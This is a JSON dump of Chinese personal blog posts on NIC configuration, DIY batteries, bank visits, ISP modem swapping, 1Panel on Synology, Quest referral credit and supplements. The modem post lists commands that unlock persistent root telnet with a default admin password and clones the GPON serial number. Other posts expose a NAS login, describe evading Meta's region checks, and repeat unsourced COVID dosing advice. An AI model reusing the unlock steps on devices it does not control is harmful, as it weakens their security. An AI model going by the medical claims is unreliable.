-d mt41686_pciconf0 set INTERNAL_CPU_PAGE_SUPPLIER=1 INTERNAL_CPU_ESWITCH_MANAGER=1 INTERNAL_CPU_IB_VPORT0=1 INTERNAL_CPU_OFFLOAD_ENGINE=1 重启之后，网卡显示未插入网线，应该是正常了？我没有条件测试，就这样了，给物主发回去了。 所有的资源都在这里，网盘链接失效了的话就从我NAS里面慢慢拖吧，另外官网里面都有下载地址，随便找找就有了。 链接：https://pan.baidu.com/s/1UV7XDu6N3P9oROhStSS8hw?pwd=2333提取码：2333 https://alist.irec.moe/@login 用户名：bf 密码：bf12345","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"https://blog.irec.moe/tags/%E7%BD%91%E5%8D%A1/"}]},{"title":"炸飞老铁之自组电池组","slug":"硬件/20240605_炸飞老铁之自组电池组/炸飞老铁之自组电池组","date":"2024-06-05T04:00:00.000Z","updated":"2024-06-05T02:16:40.000Z","comments":true,"path":"/zhafeilaotie.html","permalink":"https://blog.irec.moe/zhafeilaotie.html","excerpt":"","text":"前情提要近期由于入了短波无线垫（电）坑，迫切需要一块电池供野外架台使用，所以萌生了组一块电池组的想法。刚好自己有一些曾经从PDD薅羊毛来的电芯，遂，开干！ 前期准备查阅了一些资料，刚开始认为电池12.6V给电台用够了，另外给我自己的12V用电设备也OK，所以初步拟定电池是3S2P。然后想着8Ah容量会不会太小了，准备再并一组，在淘宝上买了一些疑似假的40LA，内阻比普通的40LA高，普遍都在9mΩ左右，不过好在还能用，容量也差不多。 BOM表 名称 价格 数量 实付款 购买渠道 21700 LS40LA K标 5 6 30 拼多多 砸金蛋，现无活动 21700 LS40LA 假标 5 3 15 淘宝 诺祥锂电池 21700 支架款镍片 4.5 1 2.5 天猫 21700 青稞纸 60张 2.8 1 0.8 天猫 启色数码旗舰店 21700 三联支架 6个 2.2 1 0.2 天猫 汉亨旗舰店 4P排线 XH2.54 1.7 2 1.4 淘宝 新容芯科技企业店 三线电压表 0.28寸 2.8 1 0.8 淘宝 船型开关 0 0 0 坏的热熔胶枪上拆的 外壳 AG 110 * 80 * 85 4.6 1 2.71 淘宝 软硅胶线 12AWG 4.3 2 5.4 淘宝 XT60E-F 带黑色防尘盖 3 1 0.91 淘宝 M2.5&#x2F;2.0 螺丝螺母诺干 0 0 0 现有的 通过88VIP+签到红包配合下来买这些零碎的东西还是很便宜的。 收货中测试新电池东西陆陆续续到货中，最开始到的是这个假标的40LA，外皮皱皱巴巴，尺寸也比K标的40LA大一圈，重量也不对。扫码二维码是不对的，观察外皮上的二维码图案也看的出来是一样的。怀疑是其他的型号套皮，不过测出来的内阻和容量都在可接受范围内，问商家商家装傻，就不和他纠缠了，直接如实评价送上。 制作过程装盒预组支架和青稞纸到了，把电池拿来做一下预组，称一下重量和量一下尺寸，塞进盒子里面。 发现塞不进盒子的顶盖，后面才发现顶盖是有凸起的结构的，具体尺寸还是要比标称的内盒尺寸小一圈，卖家完全没有说这个尺寸会偏小的问题，我这个AG 110*80*85型号的实测尺寸如下。 上盖：69.2mm*70.1mm 内盒：73.3mm*73.7mm 电池组之前量的尺寸是70.6mm，刚好塞不进去上盖，把凸起的榫头给他切了，刚好放进去。 最后的电池尺寸是68.8mm*69.3mm。 盒子开孔因为电池组不带保护板，为了监控电池电压，准备加一个开关和一个电压表，初步定的位置是在上盖。XT60接口的话，就开在盒子内正面。 想法有了，立马开干，可结果不尽人意。 计划是用宝塔钻开孔，然后慢慢扩，可是掌握不了力度，最后开的稀烂，如图。 和狗啃一样，但是还能用（xD。发群里请教经验，结果被狠狠嘲笑了。 然后 BG7EHL 大佬出来传授经验，如下 第一步 这个方孔要先划线，用刀片就行。划完脏手一摸就有印了，手太干净可以先到锅底摸一把。第二步 四个角打孔。3.2-4.0就行。俗称小钻花。打到线里面不要过线。第三步 烧报废的钢锯条。或者刀片都行，烧红了就沿着线里面一按就切穿了。4个边一切这个孔就出来了。第四步 用锉刀修，用刀子削。 事已至此，已经没有补救机会了，下次再用这个办法，准备新购一把锉刀。 点焊电池苦于没有点焊机，手头上的电池都没法发挥作用，上次组手电钻电池还是让商家点焊好发过来我这边再焊接的。最近一直在寻觅点焊机，找了一圈发现只有两种点焊机能买，电容式点焊机和变压器点焊机。 其中的门道还有很多很多，但是软包锂电的点焊机据说不能买，多点焊几次电池就不行了，事实是怎么样我也不清楚。刚开始是准备买一个电容式点焊机的，但是市面上的方案很多很多，另外看起来这个路线还没卷到头，所以就一直在观望，现在看到的比较合适的就是小强电子的电容式点焊机，他做了很多种方案，性能很好，但是价格不友好。一套能用的价格得300+了，我的预算是100左右搞一套能点0.2镀镍钢带的就够了。闲鱼上也看了看，参差不齐，有些成品电容到控制板的线还很长，另外一些成品没有外壳，很丑，我还是想搞一套比较精致的。 变压器点焊机则受限于控制板和变压器了，具体我没看，因为太重被我直接 Pass 了。 最后是求助于本地 HAM，刚开始准备去 BG7EHL 麻烦他帮点焊一下，然后 BD7BS 说他最近比较忙，直接用 BD7BS 的点焊机点好了，效果还出奇的好，他用的是变压器点焊机，焊点都不发黑，看着真舒服。 在点焊电池之后，让BD7BS帮忙给盒子重新开了一下孔，同时也观摩了一下开孔过程。效果还是比我的好很多，但是细节不够完美。 测试容量顺带测了一下容量，12.43V放电到9V，放出来10Ah，可以！ 组装电池组组装上盖船型开关直接插进去即可，电压表则我是用 M2.5 10mm 的沉头螺丝加一个 3.7mm 厚的螺母，这些材料其实都是利旧。有现成的就没有刻意去买了。 建议的参数是用 M2 * 10mm 的螺丝 加一个 4mm 厚的螺母，在电压表对应螺丝孔位置用 1.8 的麻花钻开一个孔，不要开透了，然后用螺丝直接攻丝进去，这样固定住了也很美观。也可以不用螺丝固定，直接热熔胶固定。 这里要注意的就是船型开关和电压表垂直距离要离开大一点，实际距离可以自己比划一下。 最后在表面帖一层透明胶或者保护膜都行，盖住电压表就行，注意电压表表面上是有一层膜的，记得撕掉。 焊接采集排线首先在支架上标记好焊接点，比如-，B1，B2，+，然后给镍片上预先上一点锡。完成之后，先焊接最远的一根线，然后固定好位置，其他的线超过焊接点的长度剪掉，这样搞出来的采集排线挺规整的，最后效果如下所示。 如果需要电压表的话，从电池的总负记得预留一根线上来，我用的是30AWG的硅胶线，就算碰到短路了也应该能很快烧断吧？ 焊接XT60然后就是焊接XT60接头和线，建议正负极都横着出线。我正极预留的线是10cm，负极20cm（15cm比较合适）。盒子空间比较紧凑，硅胶线在浸润锡之后有一截会变硬，导致弯折不了（是真的一点都弯折不了），最后我把正极的拆了重新弯着焊接了一下。最后热缩管是肯定要安排上的，碰到了电池外皮破皮了之后就直接炸飞老铁了（不是说着玩的！），负极的线也要上热缩管，碰到了也相当于后面两串短路了，很危险！ 焊接好XT60之后就可以装壳了，把XT60塞进去，上好螺丝，上好螺丝，上好螺丝，重要的事情说三遍，别问我为什么说三遍。 焊接电池接下来是焊接电池的总正和总负，考虑到过流能力就没焊在镍片的末尾，在镍片中间焊接的。这一步烙铁温度要开高点，建议给硅胶线先上好锡，然后再焊接到镍片上。原因是硅胶线相较于镍片线的热容积比较大，毕竟是12AWG的线，要加热好一会。我用的烙铁头是K头，Ku头不行，导热面积不够。先焊接负极，装壳进去，然后再焊接正极。其最终效果如图 焊接电压表这里就不多做叙述了，看图就行，建议先焊接表正极的检测点到开关，再焊接电池的总正到开关，防止短路。最终效果如下图所示。 三线表的话，直接电源和采集电压正极焊在一起就行，当两线用 收尾工作开洞填补之前不是有开了很丑的洞嘛，我是首先在洞的另一面贴上透明胶，然后打上热熔胶等待他自然流平然后凝固，最后撕掉热熔胶，就得到平整的表面了。 其实为了追求好看的话，比如说增加一个透明窗，可以用UV胶之类的高透胶，同时硬度也会好很多，我这边就是最低成本凑合用的做法，仅供参考。 测试电压表打开电压表，It works！ 插入SW3518模块，检测协议正常，给设备充电也正常，由于是纯降压模块，没有20V档位正常。 不均衡充电测试不均衡冲到满电12.6V，各串压差小于10mv，满意了。 后续通过观察三元锂电池SOC曲线可以得知。在3S情况下，三元锂电池还有90%电量时，单串电压有3.95V，体现到电池组上只有11.85V了。而在50%电量时单串还有3.6V左右，整串就只有10.8V了。考虑到放电时还有压降，实际使用中可能直接掉到10V以下了。 而磷酸铁锂就没这个问题，放电曲线很平缓，如下图所示。 4S情况下，SOC 90%情况下，总电压13.12，SOC 10% 下 12.6V，可见磷酸铁锂的放电特性非常适合电台使用。 还是 BD7BS 有先见之明。 改进在我实际场合中，用的设备是 IC-7300。 他的表显是 10V - 16V，查阅规格书得知推荐电压范围是 13.8 volts DC (+&#x2F;- 15%) at 21 amps 通过计算得知推荐最低电压是 11.73V，在用三元锂的情况下，可能实际效果不尽人意。所以计划改到4串。 在4串情况下，整个电池组不能充满，充满电压是 16.8V，超过IC-7300的 16V 上限了，我计划是充到 16V，也就是单串 4V，正好对应上面三元锂电池的 SOC 90%+ 状况下，同时在 10% SOC 下，也有 13.4V 的总电压，不用担心大电流掉压导致GG的问题了。 所以准备改成4串3并，然后简单计算了一下尺寸。 4串电池 68.8mm * 91.7mm 130 * 80 * 85mm 盒子 内盒标称：71.2mm * 92.9mm 内盒预估：73.3mm * 93.8mm 上盖预估：69.2mm * 90.2mm 电池组应该装得下，但是支架可能要切一下，应该是没有问题的。 直接下单新的电池和盒子还有电池支架，等待到货。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"电池","slug":"电池","permalink":"https://blog.irec.moe/tags/%E7%94%B5%E6%B1%A0/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"}]},{"title":"2024年银行网点体验记录","slug":"生活/20240222_银行卡开卡记录/2024年银行卡开卡记录","date":"2024-02-22T04:00:00.000Z","updated":"2024-02-22T13:23:28.000Z","comments":true,"path":"/2024_bank_log.html","permalink":"https://blog.irec.moe/2024_bank_log.html","excerpt":"","text":"工商银行郴州永兴支行营业室网点评价：优 经过首次前往日期：2月1日 开卡日期：2月1日 起初想问网点有没有龙年纪念卡现货，被告知没有后在网上申请后到网点激活，服务很周到，接待员还教了如何利用预约来插队。 我有一个4年前的二类户，经历3天碰到各种问题顺利销户，网点耐心解决。 我方在2月21日再去网点，因为参加“湘约惠月月刷”活动，20W限额不够用，申请改月限额。 首先柜员帮操作后碰到“工银e支付”无法开通问题，中途周转 柜员 -&gt; 大堂经理 -&gt; 年轻服务人员 -&gt; 柜员 -&gt; 主管，最后碰到 bug 无法解决，告知次日再来，此事还在解决当中。总体服务超级好，不厌其烦为客户解决问题，最后没完成还向客户致歉，我方也向对方致歉表示耽误时间了。 后续回访暂无 邮储银行永兴县干劲路支行网点评价：优 经过首次前往日期：2月2日 开卡日期：2月2日 打电话询问是否有美团联名卡库存后，遂到网点后开卡，断卡先锋我是中风险（黄马）客户（近期有新开广电卡），告知是因为广电卡改套餐引起的，询问主要用途后顺利开卡。网点服务热情友好，保安大哥特别热情。 后续回访2月20日07355523377回电询问卡是否是本人使用，态度良好，得到结果后挂机。 湖南农信永兴县干劲路支行网点评价：良 经过首次前往日期：2月6日 开卡日期：2月8日 由于是家人常去的行，陪同家人存定期后顺路询问网点人员，是否能开卡，得到否定答复。后建议我方开信用卡，得知学生能开信用卡后扫码网申，于2月22日申请通过。 次日再去和网点人员询问后说可以试试，在前台填好申请表后，在柜台开卡时遭到柜员拒绝，柜员询问我参加何种活动需要开卡，我如实告知，柜员说我们没有这种活动，我方告知柜员关注”湖南农信”微信公众号，上面有活动内容，后柜员岔开话题告知银行内有规定不给开卡，我方需询问是何种文件，柜员无法告知，后续多次柜员以各种理由推辞开卡事宜，我受不住遂离开网点。 当天下午拨打湖南农信客服热线，客服告知是以261号文件，我方仔细阅读文件后发现未有相关规定，随后再次拨打客服热线客服答应反应此问题。后日网点人员回电告知可以来开卡，次次日来到网点顺利开卡，柜员表示”我们不是不给你开卡“，我方如实告知昨日经过，柜员笑着结束话题。总体服务中规中矩，服务人员年轻，但是主管和柜员年龄偏老，思想落后不愿意接受新事物，只能给到这个评价了。 后续回访2月22日07355525888回电询问用卡相关事宜，告知我方上了反诈名单，可能会调整卡限额之类的，问我用卡主要用途，我方如实告知。后对方询问参加何种活动，我说微信公众号上有，对方再次询问细节，我方如实告知。对方说你弄这些干什么，我方告知不止这一家银行有活动，我参加的都是正规活动，你要查流水发现我有异常就随便了，后对方察觉到我对此表示反感后，挂断电话。 建设银行永兴大桥路支行网点评价：优 经过首次前往日期：2月20日 开卡日期：2月20日 年前询问我们这最大的建行网点”龙年贺岁龙卡“是否有库存，得到管理这个卡的人员放假了。在2月20日再次致电询问，告知否定答复后顺路去湖南银行开卡，告知断卡先锋为高风险客户不给开卡。 随后回家路上看到路边的支行网点，遂前往询问是否有库存。网点人员说不确定，帮我打电话询问了一下，得出肯定答复。我方询问高风险客户是否能开卡，网点人员回复说可以试试，遂填表后到柜台申请。查看断卡先锋我是中风险（黄马）客户，柜员没有多问，告知卡必须是本人使用，提额要在半个月后申请。柜员表示你是我们第一个申请”龙年贺岁龙卡“卡的客户。 后网点工作人员帮忙操作激活卡，领立减金等事宜，最后加了客户经理微信。 总体服务超赞，耐心体贴，为客户着想。 后续回访暂无 湖南银行永兴分行网点评价：差 经过首次前往日期：2月20日 开卡日期：2月20日 2月20日到网点询问我想参加活动，是否能开卡，网点人员询问用途后我方如实告知，后填表去 VTM 开卡，告知断卡先锋为高风险客户不给开卡，后我方解释用途后，可以开卡，但是不给开通在线支付，我方表示会打客服热线反应此问题。 后在网点门口打电话询问此事宜，客服人员首先是常规话术，浪费了5分钟左右。后我方主动提出提交工单处理才询问具体事宜。次日支行回电告知可以开卡，二类卡限额1000。后来到网点顺利开卡，正常服务，没有多问。 给差的理由是不为客户着想，优先考虑高价值用户，不考虑客户实际需求，随意给出否定断言，欺骗客户。 后续回访暂无 长沙银行永兴分行网点评价： 经过首次前往日期：2月21日 开卡日期： 2月21日到网点询问我想参加活动，是否能开卡，得到试一试的回答。网点人员拍照了我的学生证，学信网，云闪付卡列表，网点人员是年轻妹子，挺好说话的，她询问网点主管能不能开卡，得到否定回复，我方和网点人员交涉之后再次询问主管，依然否定回复，并未告知具体原因，遂离开网点。 离开网点后致电长沙银行客服热线，接线员是长沙妹子，声音很好听，主动询问我的诉求之后帮我仔细记录反馈，后互相问好后挂断，服务特别周到，为客户着想，非常好评。2月22日网点回电，询问卡用途，后告知无法开通在线支付，打太极几轮后最后答应给我开卡，可能限额1、200，后续有需要再提额。由于不在本地无法开卡，次日再去。 后续回访暂无 浦发银行郴州支行网点评价：优 经过2月22日陪同父亲到网点销卡，顺路询问我想参加活动，是否能开卡，得到需要给出辅助证明材料，由于我不在市区上学，户口也不在市区本地，网点人员建议我去学校当地网点开卡，后遂离去。由于办了业务给了2小时免费停车券。 总体服务好评，核心是为客户着想。 后续回访暂无","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"银行卡","slug":"银行卡","permalink":"https://blog.irec.moe/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/"},{"name":"羊毛","slug":"羊毛","permalink":"https://blog.irec.moe/tags/%E7%BE%8A%E6%AF%9B/"}]},{"title":"湖南联通固网折腾记录","slug":"硬件/20240130_湖南联通更换光猫记录/20240130_湖南联通更换光猫记录","date":"2024-01-30T04:00:00.000Z","updated":"2024-02-22T14:42:56.000Z","comments":true,"path":"/hn_unicom.html","permalink":"https://blog.irec.moe/hn_unicom.html","excerpt":"","text":"省流地区：湖南省郴州市永兴县 验证方式：验证 LOID（宽带账号） + PASSWORD（123456）+ GPON SN（不正确 BRAS 提示 AAA authenticate terminal failed） BRAS：HNCZ-YX-M6000_18S-B1 IPTV VLAN 30 INTERNET 无 VLAN TR069 VLAN 8 经过由于近期广电总局对于 OTT 限制，家人抱怨电视看不了。我于2023年11月30日看到手厅有 + 30元500M宽带 + IPTV 活动，于是在线申请，随后有一位李师傅联系我。我方询问对方户主本人不在现场是否能报装，对方帮我询问后给出我否定回复。 在我回家后2023年12月26日主动联系李师傅可以报装宽带了，次日就上门给我下安装单。他也是加友，8T用了好几年了，准备换魅族手机，白色确实好看，俩人聊天挺合得来的。 最后给我开了1000M 宽带（因为在他系统里500M 和1000M 是一样的价格）。 当天师傅就上门带着 ZTE F657GV9(V9.2.0P1T2) 和创维 E900V21A 上门安装。 光猫不带 WiFi 功能，机顶盒是S905+2+8 也不带 WiFi，问师傅没有线路怎么办，师傅有点头疼的样子。还好家里有网线，自己从踢脚线到天花板布好线了，借用了一下师傅网线钳，他在扯光纤，我在家里布线，最后忙到1点多才整好。师傅用的国产熔纤机，光纤套了管，没有用保护套，是直接剥皮线的钢丝，然后热缩管绑在上面让钢丝受力，其实也能用，就是有点丑。 机顶盒开机还不支持全屏进电视，进入老年人模式也只能做到小窗看电视，还是需要二次操作才能进入电视界面。 查看系统版本还是2022年的版本，希望能尽快落实广电总局下的《有线电视业务技术要求》和《IPTV业务技术要求》。用着暂时还能接受，父母对于操作也熟悉了，就不去投诉了。 有线电视和IPTV终端均应提供“开机进入全屏直播”和“开机进入突出直播频道的交互主页”两种“开机模式”选项。系统默认设置应为“开机进入全屏直播”。有线电视和IPTV终端开机过程所需时间应不大于35秒，不应因播放开机广告等特定内容延长开机时间。 折腾原因光猫默认配置是 NAT3，当然宽带 v4 公网是不用想的，IPv6 公网是封了 80 443 入站的，加上这有1000 M 啊，比移动的300 M 不知道快到哪里去了，我肯定得替换成主用网的。 师傅告知需要入网一个月才能更换光猫，不然会影响他的业绩，所以我在2024年1月30日的清晨开搞（不要问为啥，因为失眠了没事干啊啊啊啊啊啊） 获取参数首先的是要拿到光猫相关参数，已经问过师傅拿不到超密，只能自己动手了。 首先是拔光纤重置光猫，用默认超密 CUAdmin#HGU 进去瞅了一眼。 并没有 IPTV 相关的组播配置，以为是没有下发配置导致的，所以准备固化 Telnet 后导出配置看看。 开 Telnet使用 mayi5147 的 FactoryMode 工具得到临时 Telnet 账号密码 然后常规固化 Telnet 12345678910111213sendcmd 1 DB p TelnetCfg sendcmd 1 DB set TelnetCfg 0 Lan_Enable 1 sendcmd 1 DB set TelnetCfg 0 TS_UName root sendcmd 1 DB set TelnetCfg 0 TS_UPwd Zte521 sendcmd 1 DB set TelnetCfg 0 TSLan_UName root sendcmd 1 DB set TelnetCfg 0 TSLan_UPwd Zte521 sendcmd 1 DB set TelnetCfg 0 Max_Con_Num 99 sendcmd 1 DB set TelnetCfg 0 ExitTime 999999 sendcmd 1 DB set TelnetCfg 0 InitSecLvl 3 sendcmd 1 DB set TelnetCfg 0 CloseServerTime 9999999 sendcmd 1 DB set TelnetCfg 0 Lan_EnableAfterOlt 1 sendcmd 1 DB save reboot 下发配置 正常走完下发，超密没被改，不过上网参数没有账号，手动填入账号后正常拨号上网。 IPTV 依旧没有组播信息，IPTV 正常观看，遂直接开搞。 更换光猫换的光猫型号依旧是老朋友华为 HS8145X6，直接进去修改 LOID 和 PASSWORD 顺利走到 O5 不过拨号拨不上，IPTV 也看不了，随后发现是网口绑定错误了，绑定的4口结果 IPTV 插在1口，放的方向导致顺序颠倒插错了，排查掉这个问题依然不能看，我就有点急了，直接用电脑抓 PPPoE 包，提示 AAA authenticate terminal failed。 后面改网口 MAC 为光猫的，没用。 最后拨号过多直接被 Radius 冻结账号了。 最后多次更换排查，发现是还有一个 GPON SN 认证要素，改成原来中兴光猫的就一切正常了，虚惊一场。 更换成华为光猫之后，NAT1。 IPTV 也正常观看。 End！ 希望本文能作为参考帮助阅读到这里的各位。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"}]},{"title":"在群晖的 Docker 上安装 1Panel 面板","slug":"硬件/20240109_群晖1Panel安装/20240109_群晖1Panel安装","date":"2024-01-09T12:00:00.000Z","updated":"2024-01-16T10:25:01.000Z","comments":true,"path":"/install_1panel_with_synology_docker.html","permalink":"https://blog.irec.moe/install_1panel_with_synology_docker.html","excerpt":"","text":"起初是家里 NAS 上 docker 跑的宝塔面板经常出问题，掉电重启之后 mysql 经常会异常停止，然后去面板上经常需要重新绑定账号，所以有迁移到 1Panel 的想法。 首先使用 moelin&#x2F;1panel 镜像，需要使用 SSH 进入NAS 后，使用 sudo -i 后用 root 权限执行安装命令 12345678910docker run -d \\ --name 1panel \\ --restart always \\ --network host \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /volume2/docker/1panel/volumes:/var/lib/docker/volumes \\ -v /volume2/docker/1panel/opt:/opt \\ -v /volume2/docker/1panel/root:/root \\ -e TZ=Asia/Shanghai \\ moelin/1panel:latest 正常进入系统后安装 openresty 和 mysql，查看到报错文件映射有问题。 因为文档教程的宿主机和容器内外映射路径是一样的，所以问题出在这里。 这里就拿 mysql举例，手动修改 compose 配置文件文件映射部分，我的实际目录是在 /docker/1panel/opt/1panel/apps/mysql/mysql 下（注意这里有两个 mysql） 12345678910111213# 原始配置文件 - ./data/:/var/lib/mysql - ./conf/my.cnf:/etc/my.cnf - ./log:/var/log/mysql - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro # 下面是我的配置文件 - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/data/:/var/lib/mysql - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/conf/my.cnf:/etc/my.cnf - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/log:/var/log/mysql - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro 同时在宿主机目录下面创建好没有创建的目录或者文件，空的就行，比如我这里就少了一个 data 文件夹和 log 文件，操作好后手动点击一下重建按钮。如果还是报错查看一下错误信息，如果是缺少文件之类的报错，操作之后直接点重启即可。 如果提示 &#x2F;etc&#x2F;timezone can’t find 什么的，同样用 ssh 执行一下下面的命令即可。 12touch /etc/timezone echo &#39;Asia/Shanghai&#39; &gt; /etc/timezone 最后还是不用套娃了，在 VMM 里装了个 Rocky Linux 再装了个 1Panel，省心好多。希望此经验能帮助到大家。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"}]},{"title":"Quest 2 新设备领取30刀商店点数 & 折腾记录","slug":"硬件/20230916_Oculus Quest 2 折腾记录/Oculus Quest 2 折腾记录","date":"2023-09-16T12:00:00.000Z","updated":"2023-11-22T07:43:27.000Z","comments":true,"path":"/quest2.html","permalink":"https://blog.irec.moe/quest2.html","excerpt":"","text":"Quest 2 新设备领取30刀商店点数 &amp; 折腾记录官方的活动页面：https://www.meta.com/quest/referrals/ 先决条件1、你的设备是没被人领取过的。 2、账户创立时所用的 IP 是和邀请码同样地区的。 3、这个账户没有激活过 Quest 设备，不然点别人的推荐链接都接受不了。 4、不管你设备用了多久，只要没被人领过就能薅到这30刀。 正文起初是我想买个正版的 BS，看到有人推荐去买兑换码，然后去臭鱼搜了搜，发现别人是用送的礼金买的兑换码，再转手卖。于是我也想折腾一下礼金。我机器是买的二手，想看看前任机主有没有薅过，如果没薅过的话就把 VD 给入正了。折腾的过程中问题不断，网上的信息也是少的可怜，根据我的检索能力是找不到什么有用的信息的了。 臭鱼上有代激活的，我想着应该不难，最后摸索了一下总结出了经验。 具体步骤如下1、确定新的账户能正常接受推荐链接，也就是 ACCEPT REFERRAL 能点进去不报错。 2、头显激活过 -&gt; 恢复出厂，没有激活过直接跳过这步。 3、手机登录 Meta Quest APP，然后和头显正常配对。 4、一般配对成功后会收到一条通知，可以去 设置 -&gt; 支付方式，查看是否有礼金。 注意：注册成功后就不要切换节点了，我已经死了一个号了。暂时不知道是 APP 内通过联网检测到了还是头显检测到了，我这边是网关代理模式，用了一会这个小蓝条就消失了。 TIP2：如果小蓝条消失了，可以退出登录之后换之前用的节点在登陆，可能小紫条就又跑出来了。暂时不清楚这个机制是什么，最核心的还是不要更换 IP。 建议阅读后文后再做尝试！ 建议阅读后文后再做尝试！ 建议阅读后文后再做尝试！ 关于领取不到的问题首先是账号地区问题，如果创立时用的其他地区的，就会提示下面等类似的提示。要是有这个提示就别折腾了，你的账号在一开始就已经是非活动地区了，需要你重新创建一个账户，和用的机场一点关系都没有。 unavailable in your area oculus referrals are currently unavailable in your area. 如果确定地区正确的话，登录官方的推荐网址是这样显示的 接受者领取成功是这样一个提示 如下图是账号已经被送去其他区域的例子，同样的网络环境下打开同样的邀请链接显示不同的内容 （2023-11更新）现在 Q3 出了之后界面变成这样了 接下来就是要用到这个新注册的账户登录手机上的 Meta Quest 软件，然后头显恢复出厂，用这个账户配对，配对成功之后就能在 设置 -&gt; 支付方式 看到有可用的礼金了。 注意：注册时和登录时需要全程挂和车头同样区域的，具体自测 可用地区 Japan, Spain, Switzerland, Norway, Belgium, Netherlands, France, Taiwan, Finland, New Zealand, U.S. ,Australia, Austria, Canada, Denmark, Iceland, Ireland, Italy, Poland, United Kingdom, South Korea, and Sweden. 我用的台湾的节点（此节点已被送中，但实际 IP 地理位置在台湾），全程挂着正常注册，之后手机上的 APP 中的 Menu 菜单能显示蓝色的 banner，就算成功了。 悲，我和我朋友的设备前任机主都领过了，嫖不到哩。 关于节点地区的问题主要有四种节点类型 第一种 添加手机号提示技术错误 IP不干净 第二种 出邀请链接 不出钱包 IP是对应地区的 但是具体位置被送中 第三种 出钱包 不出邀请链接 说明IP是干净的，但是IP的实际位置不在活动区域 第四种 也是最完美的 钱包和邀请链接都会出现。IP和实际位置相符合，没有被标记，也就是土著环境 其中第一种可以和第二种和第三种相叠加，也可能是 IDC 的 IP 段不行，Meta 为了防止短信轰炸所以不让发短信。 所以想要出现推荐链接的话只要第二种和第四种环境即可。 具体测试过程通过查询经纬度判断 Meta 数据库中 IP 标记所在地区打开 https://auth.meta.com/settings/vyi/ 倒数第二项 安全与登录信息 如果节点没有被送中的话（IP实际位置和标记位置相同），手机端会显示钱包，也就是这个 IP 标记位置没有被污染，如果被污染了就不会显示钱包了。 发现机场很多节点被送中，之前注册的日区号也显示成中国了 使用日区注册的账户和日区节点会话里显示 Windows 电脑 · Inzai-shi, Chiba, Japan 但在日区节点下用台区账户重新登录之后显示 说明邀请是跟随当前账户所注册的地区的。 2023-11-12 测试 成功领取到礼金使用 中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.21 注册 账户不出钱包，出小蓝条。 标记位置在上海 纬度：31.176，经度：121.504：这个位置位于中国上海市的某个地方。 测试打开邀请链接正常 作为礼物购买测试 输入邮箱后赠送，绑卡支付即可 接收方通过收到的兑换码在商城成功兑换。 2023-11-15 小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。 开发者模式https://dashboard.oculus.com/organizations/create/ 同样的，如果开发者模式要求开 2FA 有奇怪的问题，最终还是你的节点问题，我用下面说的节点成功添加了 GV 的手机号码。 可添加手机号节点切换节点后需要登入登出两次才生效 中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.55 香港 油尖旺御金·国峯 環球全域電訊 C08 東京 上海移動 測試 猜测是 Meta 为了防止短信轰炸限制了一部分 IP 添加手机号。 顺利开启开发者模式。 总结Meta 和 Facebook 一样，检测地区比较恶心。会把账号的地区锁住，导致没法用一些功能，之后使用要特别注意，不要切换节点的地区了。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"VR","slug":"VR","permalink":"https://blog.irec.moe/tags/VR/"}]},{"title":"iHerb 初体验","slug":"生活/20230819_iHerb下单体验/iHerb 下单体验","date":"2023-08-19T04:00:00.000Z","updated":"2023-08-25T14:40:50.000Z","comments":true,"path":"/iherb.html","permalink":"https://blog.irec.moe/iherb.html","excerpt":"","text":"经群友介绍了解到了 NAC 和南非醉茄之类的 保健品。 [Boom快讯] 8月17日开始 Iherb 全场 7.5折 满299元85折，499元75折 折扣码：7XBUY活动时间：8.17-8.24（北京时间凌晨1点） 不限制使用次数～ 由于最近二阳大爆发 , 所以推荐大家一些和 COVID有关的产品 ….之前发了链接 , 然而群友们表示完全不懂 , 要我介绍一下…我也只能结合自己学到的以及”人体爆炸实验”的亲身感受简单的做介绍…毕竟是野鸡大学毕业不是医科大学… 首先 , 最有用的 , 就是 NAC , 国内属于处方药叫 乙酰半胱氨酸 .平时作为护肝保健的用量为 600mg , 1天 …COVID 感染后用量 加到 600mg X 3 , 可以有效防止COVID引起的各类并发症 …早在原始毒株的时候 欧洲的专家就用 雾化吸入NAC的方式给重症病人保命…然而国内铺天盖地的”莲花清瘟” 完全覆盖了真正有用的药品 …NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭…. 接下来是 维生素 D3+K2…具体看一下B呼 :https://zhuanlan.zhihu.com/p/415774012 ———————————————————————— 最后…因为这里有大量服用喹硫平的人 …再推荐一个南非醉茄 :https://cn.iherb.com/pr/emerald-laboratories-elevated-mood-with-affron-saffron-extract-60-vegetable-caps/116437家里老年人每天晚上做噩梦 , 像武打片一样 , 吃了这个睡的香的1B … 再也没有从床上掉到地上过…同样也适用于平时情绪紧张…容易生气的人 … 自己近期情绪不稳定，经常失眠，白天没劲，靠运动弥补好了一点，但不明显。遂准备购入一些，希望不是 placebo。 查了查资料应该是有效果的，遂小购入一点试试看，价格还能接受。 